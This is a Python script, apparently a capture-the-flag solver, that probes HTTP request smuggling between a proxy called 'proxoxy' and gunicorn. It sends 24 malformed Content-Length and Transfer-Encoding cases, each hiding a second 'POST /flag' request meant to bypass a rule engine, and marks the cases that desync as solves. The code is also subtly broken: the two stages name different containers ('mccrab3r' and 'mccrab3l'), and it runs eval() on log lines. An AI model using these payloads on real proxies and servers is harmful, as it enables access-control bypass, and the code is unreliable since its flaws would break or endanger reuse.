#!/usr/bin/env python3
"""
Body-boundary differential: proxoxy's message boundary (N) vs gunicorn's (M), same bytes.

Stage 1 (host): push each framing case through the `mccrab3r` lab (proxoxy + /app/dumper.py,
port 48888) and recover the exact bytes proxoxy wrote to the backend from `docker logs`.
Stage 2 (container): replay those bytes through gunicorn's own RequestParser in-process and
report where IT ends request 1, plus what request 2 turns out to be.

A row where M < N and request 2 carries a BREVSKI header is a full rule-engine bypass, because
the forward loop proves the body region is never rule-checked.
"""
import base64
import json
import socket
import subprocess
import sys
import time

PORT = 48888
CONTAINER = "mccrab3r"

SMUG = (b"POST /flag HTTP/1.1\r\nHost: h\r\nbrevski: george\r\n"
        b"Content-Length: 0\r\n\r\n")
N = len(SMUG)


def outer(hdrs, body=b""):
    return b"POST /flag HTTP/1.1\r\nHost: h\r\n" + hdrs + b"\r\n" + body


def chunked(payload, size_line=None, last=b"0\r\n\r\n"):
    sl = size_line if size_line is not None else b"%x" % len(payload)
    return sl + b"\r\n" + payload + b"\r\n" + last


CASES = [
    ("01 CL exact", outer(b"Content-Length: %d\r\n" % N, SMUG)),
    ("02 CL then TE chunked", outer(b"Content-Length: %d\r\nTransfer-Encoding: chunked\r\n" % N,
                                    chunked(SMUG))),
    ("03 TE chunked then CL", outer(b"Transfer-Encoding: chunked\r\nContent-Length: %d\r\n" % N,
                                    chunked(SMUG))),
    ("04 dup CL identical", outer(b"Content-Length: %d\r\nContent-Length: %d\r\n" % (N, N), SMUG)),
    ("05 dup CL conflicting", outer(b"Content-Length: %d\r\nContent-Length: 0\r\n" % N, SMUG)),
    ("06 CL leading plus", outer(b"Content-Length: +%d\r\n" % N, SMUG)),
    ("07 CL leading zeros", outer(b"Content-Length: 000%d\r\n" % N, SMUG)),
    ("08 CL surrounded by SP", outer(b"Content-Length:  %d \r\n" % N, SMUG)),
    ("09 CL hex-looking", outer(b"Content-Length: 0x%x\r\n" % N, SMUG)),
    ("10 CL trailing char", outer(b"Content-Length: %dx\r\n" % N, SMUG)),
    ("11 CL larger than sent", outer(b"Content-Length: %d\r\n" % (N + 40), SMUG)),
    ("12 CL comma list equal", outer(b"Content-Length: %d,%d\r\n" % (N, N), SMUG)),
    ("13 TE gzip,chunked", outer(b"Transfer-Encoding: gzip, chunked\r\n", chunked(SMUG))),
    ("14 TE chunked,gzip", outer(b"Transfer-Encoding: chunked, gzip\r\n", chunked(SMUG))),
    ("15 TE foo,chunked", outer(b"Transfer-Encoding: foo, chunked\r\n", chunked(SMUG))),
    ("16 TE two lines gzip+chunked",
     outer(b"Transfer-Encoding: gzip\r\nTransfer-Encoding: chunked\r\n", chunked(SMUG))),
    ("17 chunk ext", outer(b"Transfer-Encoding: chunked\r\n",
                           chunked(SMUG, size_line=b"%x;foo=bar" % N))),
    ("18 chunk size leading zeros", outer(b"Transfer-Encoding: chunked\r\n",
                                          chunked(SMUG, size_line=b"000%x" % N))),
    ("19 chunk size upper hex", outer(b"Transfer-Encoding: chunked\r\n",
                                      chunked(SMUG, size_line=(b"%X" % N)))),
    ("20 last chunk no final CRLF", outer(b"Transfer-Encoding: chunked\r\n",
                                          chunked(SMUG, last=b"0\r\n") + SMUG)),
    ("21 trailing bytes after 0CRLFCRLF", outer(b"Transfer-Encoding: chunked\r\n",
                                                chunked(SMUG) + SMUG)),
    ("22 obs-fold in CL", outer(b"Content-Length: %d\r\n \r\n" % N, SMUG)),
    ("23 CONTROL pipelined pair", outer(b"Content-Length: 0\r\n") + SMUG),
    ("24 CONTROL plain benign", outer(b"Content-Length: 0\r\n")),
]


def logcount():
    out = subprocess.run(["docker", "logs", CONTAINER], capture_output=True)
    return len((out.stdout + out.stderr).splitlines())


def send(raw):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), 4)
        s.settimeout(1.0)
        s.sendall(raw)
        while True:
            try:
                d = s.recv(65536)
            except (socket.timeout, TimeoutError):
                break
            if not d:
                break
        s.close()
    except OSError:
        pass


def collect():
    """Run every case, return {name: forwarded_bytes}.

    Only lines appended to the container log AFTER this call are parsed; the log accumulates
    across runs and a second run would otherwise concatenate both runs' bytes per case.
    """
    import os
    token = os.urandom(4).hex().encode()
    send(b"GET /RUNSTART" + token + b" HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n")
    time.sleep(0.2)
    marks = {}
    for i, (name, raw) in enumerate(CASES):
        send(b"GET /CASE%02d HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n" % i)
        time.sleep(0.15)
        send(raw)
        time.sleep(0.25)
        marks[i] = name
    out = subprocess.run(["docker", "logs", CONTAINER], capture_output=True)
    lines = (out.stdout + out.stderr).splitlines()
    # segment strictly after this run's unique start token; the log accumulates across runs
    for i, ln in enumerate(lines):
        if token in ln:
            lines = lines[i + 1:]
            break
    else:
        raise SystemExit("run token not found in container log")
    fwd, cur = {}, None
    for ln in lines:
        if not ln.startswith(b"b'") and not ln.startswith(b'b"'):
            continue
        try:
            data = eval(ln.decode("latin-1"))  # dumper emits repr(bytes)
        except Exception:
            continue
        if b"/CASE" in data[:60]:
            try:
                cur = int(data.split(b"/CASE")[1][:2])
            except Exception:
                cur = None
            fwd.setdefault(cur, b"")
            continue
        if cur is not None:
            fwd[cur] = fwd.get(cur, b"") + data
    return {marks[k]: v for k, v in fwd.items() if k in marks}


CONTAINER_SCRIPT = r'''
import base64, json, sys, io
from gunicorn.config import Config
from gunicorn.http.parser import RequestParser
from gunicorn.http.unreader import IterUnreader

cases = json.load(sys.stdin)
cfg = Config()
out = []
for name, b64 in cases:
    data = base64.b64decode(b64)
    rec = {"name": name, "N": len(data), "M": None, "req1": None, "req2": None, "err": None}
    if not data:
        out.append(rec); continue
    try:
        p = RequestParser(cfg, [data], ("127.0.0.1", 40000))
        r1 = next(p)
        rec["req1"] = "%s %s hdrs=%s" % (r1.method, r1.uri, [n for n, _ in r1.headers])
        while True:
            chunk = r1.body.read(65536)
            if not chunk:
                break
        left = p.unreader.buf.getvalue()
        try:
            left += p.unreader.chunk()
        except Exception:
            pass
        rec["M"] = len(data) - len(left)
        if left:
            try:
                p2 = RequestParser(cfg, [left], ("127.0.0.1", 40000))
                r2 = next(p2)
                rec["req2"] = "%s %s hdrs=%s" % (r2.method, r2.uri, [n for n, _ in r2.headers])
            except Exception as e:
                rec["req2"] = "PARSE-FAIL " + type(e).__name__
    except Exception as e:
        rec["err"] = type(e).__name__ + ": " + str(e)[:60]
    out.append(rec)
print(json.dumps(out))
'''


def main():
    fwd = collect()
    payload = [[name, base64.b64encode(fwd.get(name, b"")).decode()] for name, _ in CASES]
    r = subprocess.run(["docker", "exec", "-i", "mccrab3l", "python3", "-c", CONTAINER_SCRIPT],
                       input=json.dumps(payload).encode(), capture_output=True)
    if r.returncode != 0:
        print(r.stderr.decode()[-2000:])
        return
    rows = json.loads(r.stdout.decode())
    print("%-34s %6s %6s  %s" % ("case", "N(prx)", "M(gun)", "verdict"))
    wins = []
    for rec in rows:
        n, m = rec["N"], rec["M"]
        if n == 0:
            v = "proxoxy forwarded nothing (dropped/closed)"
        elif m is None:
            v = "gunicorn: " + str(rec["err"])
        elif m == n:
            v = "AGREE"
        elif m < n:
            v = "*** M<N *** req2=%s" % rec["req2"]
            if rec["req2"] and "BREVSKI" in str(rec["req2"]):
                v = "*** SOLVE *** " + v
                wins.append(rec)
        else:
            v = "M>N (gunicorn wants more)"
        print("%-34s %6s %6s  %s" % (rec["name"], n, m, v))
    print("\nrows where the boundaries disagree with a BREVSKI request 2:", len(wins))
    for w in wins:
        print(json.dumps(w, indent=1))


if __name__ == "__main__":
    main()
